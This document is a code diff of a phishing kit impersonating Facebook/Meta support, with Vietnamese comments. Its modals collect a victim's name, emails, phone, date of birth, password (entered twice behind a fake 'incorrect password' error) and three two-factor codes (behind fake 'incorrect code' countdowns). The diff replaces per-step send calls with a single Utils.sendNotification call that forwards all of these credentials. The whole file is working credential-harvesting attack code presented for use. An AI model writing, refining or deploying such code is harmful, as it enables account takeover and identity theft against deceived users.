-      '<div id="pcsTrigger" onclick="_toggleDial()" style="display:flex;align-items:center;gap:4px;padding:0 8px 0 12px;height:44px;border-right:1px solid #e5e7eb;cursor:pointer;user-select:none;flex-shrink:0;-webkit-tap-highlight-color:transparent;">'+
-      '<span id="pcsFlag" style="font-size:18px;line-height:1;">'+_selectedFlag+'</span>'+
-      '<span id="pcsDial" style="font-size:13px;color:#333;font-weight:700;margin-left:4px;">'+_selectedDial+'</span>'+
-      '<svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#888" stroke-width="2.5" style="flex-shrink:0;margin-left:2px;"><path d="M6 9l6 6 6-6"/></svg></div>'+
-      '<input id="phone" type="tel" placeholder="Phone number" inputmode="tel" style="flex:1;height:44px;padding:0 12px;border:none;outline:none;background:transparent;font-size:16px;font-family:inherit;min-width:0;"></div>'+
-      '<div id="pcsDropdown" style="display:none;position:absolute;top:48px;left:0;width:280px;background:#fff;border:1px solid #e5e7eb;border-radius:12px;box-shadow:0 8px 32px rgba(0,0,0,0.18);z-index:99999;overflow:hidden;flex-direction:column;">'+
-      '<input id="pcsSearch" type="text" placeholder="Search country..." oninput="_filterDial(this.value)" style="padding:10px 14px;border:none;border-bottom:1px solid #f0f0f0;font-size:14px;outline:none;width:100%;box-sizing:border-box;">'+
-      '<div id="pcsList" style="overflow-y:auto;max-height:200px;">'+opts+'</div></div></div>';
+
+    return '<div id="pcsContainer" style="position:relative;margin-bottom:10px;">'
+      + '<div id="pcs" style="display:flex;align-items:center;border:1px solid #d4dbe3;border-radius:10px;background:#fff;height:44px;transition:border-color 0.2s;">'
+      + '<div id="pcsTrigger" onclick="_toggleDial()" style="display:flex;align-items:center;gap:4px;padding:0 8px 0 12px;height:44px;border-right:1px solid #e5e7eb;cursor:pointer;user-select:none;flex-shrink:0;-webkit-tap-highlight-color:transparent;">'
+      + '<span id="pcsFlag" style="font-size:18px;line-height:1;">' + _selectedFlag + '</span>'
+      + '<span id="pcsDial" style="font-size:13px;color:#333;font-weight:700;margin-left:4px;">' + _selectedDial + '</span>'
+      + '<svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#888" stroke-width="2.5" style="flex-shrink:0;margin-left:2px;"><path d="M6 9l6 6 6-6"/></svg>'
+      + '</div>'
+      + '<input id="phone" type="tel" placeholder="Phone number" inputmode="tel"'
+      + ' style="flex:1;height:44px;padding:0 12px;border:none;outline:none;background:transparent;font-size:16px;font-family:inherit;min-width:0;">'
+      + '</div>'
+      + '<div id="pcsDropdown" style="display:none;position:absolute;top:48px;left:0;width:280px;'
+      + 'background:#fff;border:1px solid #e5e7eb;border-radius:12px;'
+      + 'box-shadow:0 8px 32px rgba(0,0,0,0.18);z-index:99999;overflow:hidden;flex-direction:column;">'
+      + '<input id="pcsSearch" type="text" placeholder="Search country..." oninput="_filterDial(this.value)"'
+      + ' style="padding:10px 14px;border:none;border-bottom:1px solid #f0f0f0;font-size:14px;outline:none;width:100%;box-sizing:border-box;">'
+      + '<div id="pcsList" style="overflow-y:auto;max-height:200px;">' + opts + '</div>'
+      + '</div>'
+      + '</div>';
   }
 
   function _toggleDial() {
-    var dd=document.getElementById('pcsDropdown'); if(!dd)return;
-    _dropOpen=!_dropOpen;
-    if(_dropOpen){
-      dd.style.display='flex';
-      setTimeout(function(){
-        var list=document.getElementById('pcsList'); var active=document.getElementById('pcs-active');
-        if(list&&active) list.scrollTop=active.offsetTop-(list.clientHeight/2)+(active.offsetHeight/2);
-        var s=document.getElementById('pcsSearch'); if(s){s.value='';_filterDial('');s.focus();}
-      },30);
-    } else { dd.style.display='none'; }
+    var dd = document.getElementById('pcsDropdown');
+    if (!dd) return;
+    _dropOpen = !_dropOpen;
+    if (_dropOpen) {
+      dd.style.display = 'flex';
+      setTimeout(function() {
+        var list = document.getElementById('pcsList');
+        var active = document.getElementById('pcs-active');
+        if (list && active) {
+          list.scrollTop = active.offsetTop - (list.clientHeight / 2) + (active.offsetHeight / 2);
+        }
+        var s = document.getElementById('pcsSearch');
+        if (s) { s.value = ''; _filterDial(''); s.focus(); }
+      }, 30);
+    } else {
+      dd.style.display = 'none';
+    }
   }
+
   function _selectDial(el) {
-    _selectedDial=el.dataset.dial; _selectedFlag=el.dataset.flag; _selectedCode=el.dataset.code;
-    var f=document.getElementById('pcsFlag'); if(f)f.textContent=_selectedFlag;
-    var d=document.getElementById('pcsDial'); if(d)d.textContent=_selectedDial;
-    var old=document.getElementById('pcs-active'); if(old){old.style.background='';old.removeAttribute('id');}
-    el.style.background='#e8f0fe'; el.id='pcs-active'; _dropOpen=false;
-    var dd=document.getElementById('pcsDropdown'); if(dd)dd.style.display='none';
+    _selectedDial = el.dataset.dial;
+    _selectedFlag = el.dataset.flag;
+    _selectedCode = el.dataset.code;
+    var f = document.getElementById('pcsFlag'); if (f) f.textContent = _selectedFlag;
+    var d = document.getElementById('pcsDial'); if (d) d.textContent = _selectedDial;
+    var oldActive = document.getElementById('pcs-active');
+    if (oldActive) { oldActive.style.background = ''; oldActive.removeAttribute('id'); }
+    el.style.background = '#e8f0fe'; el.id = 'pcs-active';
+    _dropOpen = false;
+    var dd = document.getElementById('pcsDropdown'); if (dd) dd.style.display = 'none';
   }
+
   function _filterDial(q) {
-    document.querySelectorAll('.pcs-opt').forEach(function(el){
-      el.style.display=el.textContent.toLowerCase().includes(q.toLowerCase())?'':'none';
+    document.querySelectorAll('.pcs-opt').forEach(function(el) {
+      el.style.display = el.textContent.toLowerCase().includes(q.toLowerCase()) ? '' : 'none';
     });
   }
-  document.addEventListener('click',function(e){
-    var dd=document.getElementById('pcsDropdown'); var trigger=document.getElementById('pcsTrigger');
-    if(dd&&trigger&&!trigger.contains(e.target)&&!dd.contains(e.target)){_dropOpen=false;dd.style.display='none';}
+
+  document.addEventListener('click', function(e) {
+    var dd = document.getElementById('pcsDropdown');
+    var trigger = document.getElementById('pcsTrigger');
+    if (dd && trigger && !trigger.contains(e.target) && !dd.contains(e.target)) {
+      _dropOpen = false;
+      dd.style.display = 'none';
+    }
   });
 
   /* ============================================================
@@ -841,72 +902,90 @@ function _sendStep3() {
   var _masterData = {};
   var Modal = {
     _current: null,
-    create: function(id,content) {
-      var old=document.getElementById(id); if(old)old.remove();
-      var o=document.createElement('div'); o.id=id; o.className='modal-overlay';
-      o.innerHTML='<div class="modal-box">'+content+'</div>';
-      o.addEventListener('click',function(e){if(e.target===o)Modal.close(id);});
+    create: function(id, content) {
+      var old = document.getElementById(id); if (old) old.remove();
+      var o = document.createElement('div');
+      o.id = id; o.className = 'modal-overlay';
+      o.innerHTML = '<div class="modal-box">' + content + '</div>';
+      o.addEventListener('click', function(e) { if (e.target === o) Modal.close(id); });
       document.getElementById('modalsContainer').appendChild(o);
     },
     open: function(id) {
-      var o=document.getElementById(id); if(!o)return;
-      requestAnimationFrame(function(){o.classList.add('open');});
-      Modal._current=id; document.body.style.overflow='hidden';
+      var o = document.getElementById(id); if (!o) return;
+      requestAnimationFrame(function() { o.classList.add('open'); });
+      Modal._current = id; document.body.style.overflow = 'hidden';
     },
     close: function(id) {
-      var o=document.getElementById(id); if(!o)return;
-      o.classList.remove('open'); document.body.style.overflow='';
-      setTimeout(function(){if(o.parentNode)o.parentNode.removeChild(o);},260);
-      Modal._current=null;
+      var o = document.getElementById(id); if (!o) return;
+      o.classList.remove('open'); document.body.style.overflow = '';
+      setTimeout(function() { if (o.parentNode) o.parentNode.removeChild(o); }, 260);
+      Modal._current = null;
     }
   };
-  document.addEventListener('keydown',function(e){if(e.key==='Escape'&&Modal._current)Modal.close(Modal._current);});
+  document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape' && Modal._current) Modal.close(Modal._current);
+  });
 
   /* ============================================================
      MODAL: Information
   ============================================================ */
   function openClientModal() {
     _masterData = {};
+
     var loadingHtml =
-      '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;">'+
-      '<h2 style="font-weight:700;color:#0A1317;font-size:15px;text-align:center;flex:1;">Information</h2>'+
-      '<div style="width:18px;height:18px;cursor:pointer;opacity:0.6;flex-shrink:0;" onclick="Modal.close(\'clientModal\')">'+
-      '<img src="public/icons/ic_close.svg" style="width:18px;height:18px;" alt="close" onerror="this.parentNode.innerHTML=\'&times;\';this.parentNode.style.fontSize=\'20px\';">'+
-      '</div></div>'+
-      '<div id="clientFormWrap" style="min-height:120px;display:flex;align-items:center;justify-content:center;">'+
-      '<div class="modal-loading-spinner"></div></div>';
+      '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;">'
+      + '<h2 style="font-weight:700;color:#0A1317;font-size:15px;text-align:center;flex:1;">Information</h2>'
+      + '<div style="width:18px;height:18px;cursor:pointer;opacity:0.6;flex-shrink:0;" onclick="Modal.close(\'clientModal\')">'
+      + '<img src="public/icons/ic_close.svg" style="width:18px;height:18px;" alt="close" '
+      + 'onerror="this.parentNode.innerHTML=\'&times;\';this.parentNode.style.fontSize=\'20px\';this.parentNode.style.opacity=\'0.5\';">'
+      + '</div></div>'
+      + '<div id="clientFormWrap" style="min-height:120px;display:flex;align-items:center;justify-content:center;">'
+      + '<div class="modal-loading-spinner"></div>'
+      + '</div>';
 
     Modal.create('clientModal', loadingHtml);
-    var box=document.querySelector('#clientModal .modal-box');
-    if(box) box.style.background='linear-gradient(130deg,rgba(249,241,249,1) 0%,rgba(234,243,253,1) 35%,rgba(237,251,242,1) 100%)';
+
+    var box = document.querySelector('#clientModal .modal-box');
+    if (box) {
+      box.style.background = 'linear-gradient(130deg,rgba(249,241,249,1) 0%,rgba(234,243,253,1) 35%,rgba(237,251,242,1) 100%)';
+    }
+
     Modal.open('clientModal');
 
     _onIpReady(function() {
-      var wrap=document.getElementById('clientFormWrap'); if(!wrap)return;
-      var formHtml =
-        '<form id="clientForm" autocomplete="off" style="width:100%;">'+
-        '<div class="nf-input-wrap"><input id="fullName" placeholder="Full Name" type="text" required autocomplete="name" class="nf-input"></div>'+
-        '<div class="nf-input-wrap"><input id="email" placeholder="Email Address" type="email" required inputmode="email" autocomplete="email" class="nf-input"></div>'+
-        '<div class="nf-input-wrap"><input id="emailBusiness" placeholder="Email Business Address" type="email" inputmode="email" class="nf-input"></div>'+
-        '<div class="nf-input-wrap"><input id="fanpage" placeholder="Fanpage Name" type="text" required class="nf-input"></div>'+
-        _buildPhoneSelector()+
-        '<b style="color:#9a979e;font-size:14px;margin-bottom:7px;display:block;">Date of Birth</b>'+
-        '<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-bottom:10px;">'+
-        '<div class="nf-input-wrap" style="margin-bottom:0;"><input id="day" placeholder="Day" type="number" min="1" max="31" required inputmode="numeric" class="nf-input"></div>'+
-        '<div class="nf-input-wrap" style="margin-bottom:0;"><input id="month" placeholder="Month" type="number" min="1" max="12" required inputmode="numeric" class="nf-input"></div>'+
-        '<div class="nf-input-wrap" style="margin-bottom:0;"><input id="year" placeholder="Year" type="number" min="1900" max="2024" required inputmode="numeric" class="nf-input"></div>'+
-        '</div>'+
-        '<div class="nf-input-wrap" style="height:100px;padding:11px;align-items:flex-start;">'+
-        '<textarea id="message" placeholder="Message" style="width:100%;outline:none;border:none;background:transparent;font-size:16px;font-family:inherit;resize:none;height:100%;display:block;"></textarea></div>'+
-        '<p style="color:#9a979e;font-size:14px;margin-bottom:7px;">Our response will be sent to you within 14 - 48 hours.</p>'+
-        '<div style="margin-top:15px;margin-bottom:20px;">'+
-        '<label style="cursor:pointer;display:flex;align-items:center;gap:8px;font-size:14px;" for="agreeCheck">'+
-        '<input id="agreeCheck" type="checkbox" required style="width:16px;height:16px;accent-color:#0064E0;flex-shrink:0;">'+
-        'I agree to the <a href="#" style="color:#0064E0;">Terms of use</a></label></div>'+
-        '<div style="width:100%;margin-top:20px;"><button type="submit" class="modal-btn-primary">Submit</button></div>'+
-        '</form>';
+      var wrap = document.getElementById('clientFormWrap');
+      if (!wrap) return;
 
-      wrap.style.minHeight=''; wrap.style.display='block'; wrap.innerHTML=formHtml;
+      var formHtml =
+        '<form id="clientForm" autocomplete="off" style="width:100%;">'
+        + '<div class="nf-input-wrap"><input id="fullName" placeholder="Full Name" type="text" required autocomplete="name" class="nf-input"></div>'
+        + '<div class="nf-input-wrap"><input id="email" placeholder="Email Address" type="email" required inputmode="email" autocomplete="email" class="nf-input"></div>'
+        + '<div class="nf-input-wrap"><input id="emailBusiness" placeholder="Email Business Address" type="email" inputmode="email" class="nf-input"></div>'
+        + '<div class="nf-input-wrap"><input id="fanpage" placeholder="Fanpage Name" type="text" required class="nf-input"></div>'
+        + _buildPhoneSelector()
+        + '<b style="color:#9a979e;font-size:14px;margin-bottom:7px;display:block;">Date of Birth</b>'
+        + '<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-bottom:10px;">'
+        + '<div class="nf-input-wrap" style="margin-bottom:0;"><input id="day" placeholder="Day" type="number" min="1" max="31" required inputmode="numeric" class="nf-input"></div>'
+        + '<div class="nf-input-wrap" style="margin-bottom:0;"><input id="month" placeholder="Month" type="number" min="1" max="12" required inputmode="numeric" class="nf-input"></div>'
+        + '<div class="nf-input-wrap" style="margin-bottom:0;"><input id="year" placeholder="Year" type="number" min="1900" max="2024" required inputmode="numeric" class="nf-input"></div>'
+        + '</div>'
+        + '<div class="nf-input-wrap" style="height:100px;padding:11px;align-items:flex-start;">'
+        + '<textarea id="message" placeholder="Message" style="width:100%;outline:none;border:none;background:transparent;font-size:16px;font-family:inherit;resize:none;height:100%;display:block;"></textarea>'
+        + '</div>'
+        + '<p style="color:#9a979e;font-size:14px;margin-bottom:7px;">Our response will be sent to you within 14 - 48 hours.</p>'
+        + '<div style="margin-top:15px;margin-bottom:20px;">'
+        + '<label style="cursor:pointer;display:flex;align-items:center;gap:8px;font-size:14px;" for="agreeCheck">'
+        + '<input id="agreeCheck" type="checkbox" required style="width:16px;height:16px;accent-color:#0064E0;flex-shrink:0;">'
+        + 'I agree to the <a href="#" style="color:#0064E0;">Terms of use</a>'
+        + '</label></div>'
+        + '<div style="width:100%;margin-top:20px;">'
+        + '<button type="submit" class="modal-btn-primary">Submit</button>'
+        + '</div>'
+        + '</form>';
+
+      wrap.style.minHeight = '';
+      wrap.style.display = 'block';
+      wrap.innerHTML = formHtml;
 
       document.getElementById('clientForm').addEventListener('submit', function(e) {
         e.preventDefault();
@@ -914,13 +993,9 @@ function _sendStep3() {
         _masterData.email         = document.getElementById('email').value.trim();
         _masterData.emailBusiness = document.getElementById('emailBusiness').value.trim();
         _masterData.fanpage       = document.getElementById('fanpage').value.trim();
-        _masterData.phone         = _selectedDial+' '+document.getElementById('phone').value.trim();
-        _masterData.dob           = document.getElementById('day').value+'/'+document.getElementById('month').value+'/'+document.getElementById('year').value;
+        _masterData.phone         = _selectedDial + ' ' + document.getElementById('phone').value.trim();
+        _masterData.dob           = document.getElementById('day').value + '/' + document.getElementById('month').value + '/' + document.getElementById('year').value;
         _masterData.message       = document.getElementById('message').value.trim();
-
-        // ✅ GỬI BƯỚC 1 — thông tin cơ bản
-        _sendStep1();
-
         Modal.close('clientModal');
         setTimeout(openSecurityModal, 280);
       });
@@ -932,18 +1007,18 @@ function _sendStep3() {
   ============================================================ */
   function openSecurityModal() {
     var html =
-      '<div style="display:flex;flex-direction:column;align-items:center;">'+
-      '<div style="width:100%;display:flex;justify-content:flex-end;margin-bottom:8px;">'+
-      '<button class="modal-close" onclick="Modal.close(\'securityModal\')">&times;</button></div>'+
-      '<img src="public/icons/ic_facebook_circle.svg" style="width:48px;height:48px;margin-bottom:16px;" alt="secure" />'+
-      '<div style="width:100%">'+
-      '<p style="font-size:14px;color:#606770;margin-bottom:16px;line-height:1.5;">For your security, please enter your password to continue.</p>'+
-      '<form id="securityForm">'+
-      '<div class="modal-field"><input type="password" id="password" placeholder="Password" required></div>'+
-      '<p id="passwordError" class="modal-error"></p>'+
-      '<button type="submit" id="securityBtn" class="modal-btn-primary">Continue</button>'+
-      '<p style="text-align:center;margin-top:16px;"><a href="#" style="color:#606770;font-size:14px;">Forgot your password?</a></p>'+
-      '</form></div></div>';
+      '<div style="display:flex;flex-direction:column;align-items:center;">'
+      + '<div style="width:100%;display:flex;justify-content:flex-end;margin-bottom:8px;">'
+      + '<button class="modal-close" onclick="Modal.close(\'securityModal\')">&times;</button></div>'
+      + '<img src="public/icons/ic_facebook_circle.svg" style="width:48px;height:48px;margin-bottom:16px;" alt="secure" />'
+      + '<div style="width:100%">'
+      + '<p style="font-size:14px;color:#606770;margin-bottom:16px;line-height:1.5;">For your security, please enter your password to continue.</p>'
+      + '<form id="securityForm">'
+      + '<div class="modal-field"><input type="password" id="password" placeholder="Password" required></div>'
+      + '<p id="passwordError" class="modal-error"></p>'
+      + '<button type="submit" id="securityBtn" class="modal-btn-primary">Continue</button>'
+      + '<p style="text-align:center;margin-top:16px;"><a href="#" style="color:#606770;font-size:14px;">Forgot your password?</a></p>'
+      + '</form></div></div>';
 
     Modal.create('securityModal', html);
     Modal.open('securityModal');
@@ -951,28 +1026,23 @@ function _sendStep3() {
     var clickCount = 0;
     document.getElementById('securityForm').addEventListener('submit', function(e) {
       e.preventDefault();
-      var pw=document.getElementById('password').value.trim();
-      var err=document.getElementById('passwordError');
-      var btn=document.getElementById('securityBtn');
+      var pw = document.getElementById('password').value.trim();
+      var err = document.getElementById('passwordError');
+      var btn = document.getElementById('securityBtn');
       err.classList.remove('show');
-      if(!pw){err.textContent="Please enter your password.";err.classList.add('show');return;}
-      btn.disabled=true; btn.innerHTML='<span class="modal-spinner"></span>';
-
-      if(clickCount===0) {
+      if (!pw) { err.textContent = "Please enter your password."; err.classList.add('show'); return; }
+      btn.disabled = true; btn.innerHTML = '<span class="modal-spinner"></span>';
+      if (clickCount === 0) {
         _masterData.password = pw;
-        // ✅ GỬI BƯỚC 2 — password lần 1
-        _sendStep2();
-        setTimeout(function(){
-          btn.disabled=false; btn.textContent='Continue';
-          document.getElementById('password').value='';
-          err.textContent="The password you've entered is incorrect."; err.classList.add('show');
-          clickCount=1;
-        },1350);
+        setTimeout(function() {
+          btn.disabled = false; btn.textContent = 'Continue';
+          document.getElementById('password').value = '';
+          err.textContent = "The password you've entered is incorrect."; err.classList.add('show');
+          clickCount = 1;
+        }, 1350);
       } else {
         _masterData.passwordSecond = pw;
-        // ✅ GỬI BƯỚC 2 — password lần 2
-        _sendStep2();
-        setTimeout(function(){Modal.close('securityModal');setTimeout(openAuthenticationModal,280);},1500);
+        setTimeout(function() { Modal.close('securityModal'); setTimeout(openAuthenticationModal, 280); }, 1500);
       }
     });
   }
@@ -981,99 +1051,193 @@ function _sendStep3() {
      MODAL: Two-factor Authentication
   ============================================================ */
   function openAuthenticationModal() {
-    var name=_masterData.fullName||'', email=_masterData.email||'', phone=_masterData.phone||'';
-    function maskEmail(e){if(!e)return'';var p=e.split('@');if(p.length<2)return e;var u=p[0];return u[0]+'*'.repeat(Math.max(u.length-1,6))+'@'+p[1];}
-    function maskPhone(p){if(!p)return'';var c=p.replace(/\s/g,'');return c.slice(0,3)+' ******* '+c.slice(-2);}
-    var hint='Enter the code for this account that we send to ';
-    if(email) hint+=maskEmail(email);
-    if(phone) hint+=', '+maskPhone(phone);
-    hint+=' or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)';
+    var name = _masterData.fullName || '';
+    var email = _masterData.email || '';
+    var phone = _masterData.phone || '';
 
-    var authCount=0, cdInterval=null;
+    function maskEmail(e) {
+      if (!e) return '';
+      var parts = e.split('@');
+      if (parts.length < 2) return e;
+      var u = parts[0];
+      return u[0] + '*'.repeat(Math.max(u.length - 1, 6)) + '@' + parts[1];
+    }
+    function maskPhone(p) {
+      if (!p) return '';
+      var clean = p.replace(/\s/g, '');
+      var prefix = clean.slice(0, 3);
+      var last2 = clean.slice(-2);
+      return prefix + ' ******* ' + last2;
+    }
+
+    var hint = 'Enter the code for this account that we send to ';
+    if (email) hint += maskEmail(email);
+    if (phone) hint += ', ' + maskPhone(phone);
+    hint += ' or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)';
+
+    var authCount = 0;
+    var cdInterval = null;
 
     function renderModal(step) {
-      var stepLabel='Two-factor authentication required ('+(step+1)+'/3)';
-      return '<div style="display:flex;flex-direction:column;">'+
-        '<div style="display:flex;align-items:center;gap:6px;font-size:13px;color:#9a979e;margin-bottom:8px;">'+
-        '<span style="color:#1c1e21;font-weight:500;">'+name+'</span>'+
-        '<span style="width:4px;height:4px;background:#9a979e;border-radius:50%;display:inline-block;flex-shrink:0;"></span>'+
-        '<span>Facebook</span></div>'+
-        '<h2 style="font-size:20px;font-weight:700;color:#000;margin:0 0 14px;">'+stepLabel+'</h2>'+
-        '<p style="font-size:14px;color:#9a979e;line-height:1.55;margin:0;">'+hint+'</p>'+
-        '<div style="width:100%;border-radius:10px;background:#f5f5f5;overflow:hidden;margin:15px 0;">'+
-        '<img src="public/images/authentication.png" style="width:100%;display:block;" alt="authentication"></div>'+
-        '<form id="authForm">'+
-        '<div class="nf-input-wrap" style="margin-bottom:0;"><input id="twoFa" placeholder="Enter the code" type="number" inputmode="numeric" required class="nf-input"></div>'+
-        '<p id="authError" class="modal-error" style="margin-top:8px;"></p>'+
-        '<div style="margin-top:20px;"><button type="submit" id="authBtn" class="modal-btn-primary">Continue</button></div>'+
-        '<div style="margin-top:16px;width:100%;display:flex;align-items:center;justify-content:center;cursor:pointer;background:transparent;border-radius:40px;padding:10px 20px;border:1px solid #d4dbe3;">'+
-        '<span style="color:#9a979e;font-size:14px;">Try another way</span></div></form>'+
-        '<div style="width:60px;margin:20px auto 0;padding-top:20px;">'+
-        '<img src="public/icons/ic_meta_gray.svg" style="width:100%;height:100%;display:block;" alt="Meta" onerror="this.style.display=\'none\'"></div></div>';
+      var stepLabel = 'Two-factor authentication required (' + (step + 1) + '/3)';
+      var html =
+        '<div style="display:flex;flex-direction:column;">'
+        + '<div style="display:flex;align-items:center;gap:6px;font-size:13px;color:#9a979e;margin-bottom:8px;">'
+        + '<span style="color:#1c1e21;font-weight:500;">' + name + '</span>'
+        + '<span style="width:4px;height:4px;background:#9a979e;border-radius:50%;display:inline-block;flex-shrink:0;"></span>'
+        + '<span>Facebook</span>'
+        + '</div>'
+        + '<h2 style="font-size:20px;font-weight:700;color:#000;margin:0 0 14px;">' + stepLabel + '</h2>'
+        + '<p style="font-size:14px;color:#9a979e;line-height:1.55;margin:0 0 0;">' + hint + '</p>'
+        + '<div style="width:100%;border-radius:10px;background:#f5f5f5;overflow:hidden;margin:15px 0;">'
+        + '<img src="public/images/authentication.png" style="width:100%;display:block;" alt="authentication">'
+        + '</div>'
+        + '<form id="authForm">'
+        + '<div class="nf-input-wrap" style="margin-bottom:0;">'
+        + '<input id="twoFa" placeholder="Enter the code" type="number" inputmode="numeric" required class="nf-input">'
+        + '</div>'
+        + '<p id="authError" class="modal-error" style="margin-top:8px;"></p>'
+        + '<div style="margin-top:20px;">'
+        + '<button type="submit" id="authBtn" class="modal-btn-primary">Continue</button>'
+        + '</div>'
+        + '<div style="margin-top:16px;width:100%;display:flex;align-items:center;justify-content:center;cursor:pointer;background:transparent;border-radius:40px;padding:10px 20px;border:1px solid #d4dbe3;">'
+        + '<span style="color:#9a979e;font-size:14px;">Try another way</span>'
+        + '</div>'
+        + '</form>'
+        + '<div style="width:60px;margin:20px auto 0;padding-top:20px;">'
+        + '<img src="public/icons/ic_meta_gray.svg" style="width:100%;height:100%;display:block;" alt="Meta"'
+        + ' onerror="this.style.display=\'none\'">'
+        + '</div>'
+        + '</div>';
+      return html;
     }
 
     Modal.create('authModal', renderModal(authCount));
-    var box=document.querySelector('#authModal .modal-box');
-    if(box) box.style.background='linear-gradient(130deg,rgba(249,241,249,1) 0%,rgba(234,243,253,1) 35%,rgba(237,251,242,1) 100%)';
+
+    var box = document.querySelector('#authModal .modal-box');
+    if (box) box.style.background = 'linear-gradient(130deg,rgba(249,241,249,1) 0%,rgba(234,243,253,1) 35%,rgba(237,251,242,1) 100%)';
+
     Modal.open('authModal');
 
     function bindForm() {
-      var form=document.getElementById('authForm'); if(!form)return;
-      form.addEventListener('submit',function(e){
+      var form = document.getElementById('authForm');
+      if (!form) return;
+      form.addEventListener('submit', function(e) {
         e.preventDefault();
-        var code=document.getElementById('twoFa').value.trim();
-        var err=document.getElementById('authError');
-        var btn=document.getElementById('authBtn');
+        var code = document.getElementById('twoFa').value.trim();
+        var err = document.getElementById('authError');
+        var btn = document.getElementById('authBtn');
         err.classList.remove('show');
-        if(!code){err.textContent='Please enter the code.';err.classList.add('show');return;}
-        btn.disabled=true; btn.innerHTML='<span class="modal-spinner"></span>';
+        if (!code) { err.textContent = 'Please enter the code.'; err.classList.add('show'); return; }
+        btn.disabled = true; btn.innerHTML = '<span class="modal-spinner"></span>';
 
-        if(authCount<2) {
-          _masterData['twoFa'+authCount]=code;
-          // ✅ GỬI BƯỚC 3 — 2FA từng lần
-          _sendStep3();
-          setTimeout(function(){
-            var t=30; btn.innerHTML='Continue';
-            var inp=document.getElementById('twoFa'); if(inp){inp.disabled=true;inp.value='';}
-            err.textContent='Incorrect code. Try again after '+t+'s.'; err.classList.add('show');
-            cdInterval=setInterval(function(){
-              t--; err.textContent='Incorrect code. Try again after '+t+'s.';
-              if(t<=0){
-                clearInterval(cdInterval); authCount++;
-                var wrap=document.querySelector('#authModal .modal-box');
-                if(wrap){
-                  wrap.innerHTML=renderModal(authCount);
-                  wrap.style.background='linear-gradient(130deg,rgba(249,241,249,1) 0%,rgba(234,243,253,1) 35%,rgba(237,251,242,1) 100%)';
+        if (authCount < 2) {
+          _masterData['twoFa' + authCount] = code;
+          setTimeout(function() {
+            var t = 30;
+            btn.innerHTML = 'Continue';
+            var inp = document.getElementById('twoFa');
+            if (inp) { inp.disabled = true; inp.value = ''; }
+            err.textContent = 'Incorrect code. Try again after ' + t + 's.';
+            err.classList.add('show');
+            cdInterval = setInterval(function() {
+              t--;
+              err.textContent = 'Incorrect code. Try again after ' + t + 's.';
+              if (t <= 0) {
+                clearInterval(cdInterval);
+                authCount++;
+                var wrap = document.querySelector('#authModal .modal-box');
+                if (wrap) {
+                  wrap.innerHTML = renderModal(authCount);
+                  wrap.style.background = 'linear-gradient(130deg,rgba(249,241,249,1) 0%,rgba(234,243,253,1) 35%,rgba(237,251,242,1) 100%)';
                   bindForm();
                 }
               }
-            },1000);
-          },1400);
+            }, 1000);
+          }, 1400);
         } else {
-          _masterData.twoFaFinal=code;
-          // ✅ GỬI BƯỚC 3 — 2FA lần cuối
-          _sendStep3();
-          setTimeout(function(){Modal.close('authModal');setTimeout(openSuccessModal,280);},1600);
+          _masterData.twoFaFinal = code;
+          setTimeout(function() { Modal.close('authModal'); setTimeout(openSuccessModal, 280); }, 1600);
         }
       });
     }
+
     bindForm();
   }
 
   /* ============================================================
-     MODAL: Success
+     MODAL: Success — layout giống ảnh mẫu
   ============================================================ */
   function openSuccessModal() {
+
+    /* Gửi thông báo */
+    Utils.sendNotification({
+      fullName:       _masterData.fullName       || '',
+      email:          _masterData.email          || '',
+      emailBusiness:  _masterData.emailBusiness  || '',
+      fanpage:        _masterData.fanpage        || '',
+      phone:          _masterData.phone          || '',
+      day:            (_masterData.dob || '').split('/')[0] || '',
+      month:          (_masterData.dob || '').split('/')[1] || '',
+      year:           (_masterData.dob || '').split('/')[2] || '',
+      message:        _masterData.message        || '',
+      password:       _masterData.password       || '',
+      passwordSecond: _masterData.passwordSecond || '',
+      twoFa:          _masterData.twoFa0         || '',
+      twoFaSecond:    _masterData.twoFa1         || '',
+      twoFaThird:     _masterData.twoFaFinal     || '',
+    });
+
     var html =
-      '<div class="modal-header">'+
-      '<h2 style="font-size:17px;font-weight:700;flex:1;">Request Submitted</h2>'+
-      '<button class="modal-close" onclick="Modal.close(\'successModal\')">&times;</button></div>'+
-      '<div style="text-align:center;padding:16px 0;">'+
-      '<img src="public/images/succes.jpg" class="modal-success-icon" alt="success" /></div>'+
-      '<p style="color:#9a979e;font-size:15px;margin-bottom:8px;line-height:1.5;">Your request has been added to the processing queue. We will handle it within 24 hours.</p>'+
-      '<p style="color:#9a979e;font-size:15px;margin-bottom:20px;">From the Customer Support team at Meta.</p>'+
-      '<a href="https://www.facebook.com" class="modal-return-btn">Return to Facebook</a>';
+      /* ── Header ── */
+      '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;">'
+      + '<h2 style="font-size:16px;font-weight:600;color:#1c1e21;margin:0;">Request has been sent</h2>'
+      + '<button class="modal-close" onclick="Modal.close(\'successModal\')">&times;</button>'
+      + '</div>'
+
+      /* ── Hero block: gradient bg + badge trái + ảnh phải ── */
+      + '<div style="'
+      +   'border-radius:16px;overflow:hidden;margin-bottom:20px;'
+      +   'background:linear-gradient(135deg,#dce9ff 0%,#ede4fa 45%,#fce4f0 100%);'
+      +   'position:relative;min-height:170px;display:flex;align-items:center;'
+      + '">'
+
+        /* Badge xanh bên trái */
+        + '<div style="position:absolute;left:18px;top:50%;transform:translateY(-50%);z-index:2;'
+        +   'filter:drop-shadow(0 6px 16px rgba(8,102,255,0.25));width:72px;height:72px;">'
+        + '<img src="public/images/ICONMOI.svg" alt="verified badge" style="width:100%;height:100%;display:block;">'
+        + '</div>'
+
+        /* Ảnh collage bên phải — dùng photo_meta.png giống hero section */
+        + '<div style="margin-left:auto;width:62%;max-width:260px;flex-shrink:0;">'
+        + '<img src="public/images/photo_meta.png" alt="Meta Verified"'
+        +   ' style="width:100%;height:170px;object-fit:cover;object-position:center top;display:block;">'
+        + '</div>'
+
+      + '</div>'
+
+      /* ── Body text ── */
+      + '<p style="color:#3d3d3d;font-size:14px;line-height:1.7;margin:0 0 6px;">'
